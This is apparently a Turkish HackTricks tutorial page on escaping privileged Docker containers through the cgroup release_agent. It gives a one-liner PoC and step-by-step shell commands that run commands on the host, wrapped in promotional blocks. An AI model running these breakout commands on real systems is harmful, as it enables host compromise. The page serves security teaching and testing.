# Docker release\_agent cgroups kaçışı

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**]'ni edinin (https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'ler**] koleksiyonumuz (https://opensea.io/collection/the-peass-family)
* **Katılın** 💬 [**Discord grubuna**] (https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**] veya bizi **Twitter** 🐦 [**@carlospolopm**] (https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**] (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**] (https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) **karanlık ağ** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için **ücretsiz** işlevler sunar.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

**Daha fazla ayrıntı için, [orijinal blog gönderisine](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) başvurun.** Bu sadece bir özet:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
**Kavram Kanıtı (PoC)**, cgroups'ı sömürmek için bir yöntemi gösterir. Bu, `release_agent` dosyası oluşturarak ve çağrısını tetikleyerek konteyner ana bilgisayarında keyfi komutları yürütmek için kullanılır. İşte dahil olan adımların ayrıntıları:

1. **Ortamı Hazırla:**
   - `cgroup` için bir bağlantı noktası olarak hizmet verecek `/tmp/cgrp` adlı bir dizin oluşturulur.
   - RDMA cgroup denetleyicisi bu dizine bağlanır. RDMA denetleyicisinin bulunmaması durumunda, alternatif olarak `memory` cgroup denetleyicisinin kullanılması önerilir.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Çocuk Cgroup'u Kurulumu:**
   - Bağlanmış cgroup dizini içinde "x" adında bir çocuk cgroup oluşturulur.
   - "x" cgroup için bildirimler, notify_on_release dosyasına 1 yazılarak etkinleştirilir.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Yayın Ajanını Yapılandır:**
   - Konteynerin ana bilgisayar üzerindeki yolu /etc/mtab dosyasından elde edilir.
   - Ardından cgroup'un release_agent dosyası, elde edilen ana bilgisayar yolunda bulunan /cmd adlı bir betiği çalıştırmak üzere yapılandırılır.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd Betiği Oluşturun ve Yapılandırın:**
- /cmd betiği konteyner içinde oluşturulur ve ps aux komutunu çalıştırmak üzere yapılandırılır, çıktı /output adlı bir dosyaya yönlendirilir. Ana bilgisayar üzerindeki /output'un tam yolu belirtilir.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Saldırıyı Tetikle:**
- Bir işlem "x" çocuk cgroup içinde başlatılır ve hemen sonlandırılır.
- Bu, `release_agent` (the /cmd script) tetikler ve ana bilgisayarda ps aux komutunu çalıştırır ve çıktıyı konteyner içinde /output'a yazar.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize** edilip edilmediğini kontrol etmek için **ücretsiz** işlevler sunan **dark web** destekli bir arama motorudur.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) görün
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
